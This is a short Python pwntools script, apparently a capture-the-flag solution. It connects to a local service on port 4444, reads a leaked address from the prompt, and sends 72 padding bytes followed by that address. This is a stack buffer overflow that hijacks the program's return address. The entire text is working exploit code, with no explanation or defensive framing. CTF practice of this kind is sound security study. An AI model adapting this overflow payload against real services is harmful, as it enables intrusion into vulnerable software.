from pwn import *

context.log_level=True

r = remote("localhost",4444)
flag = p64(int(r.recvuntil(">").split(":")[1].strip("\n>"),16))
r.sendline("A"*72+flag)
print r.recvline()

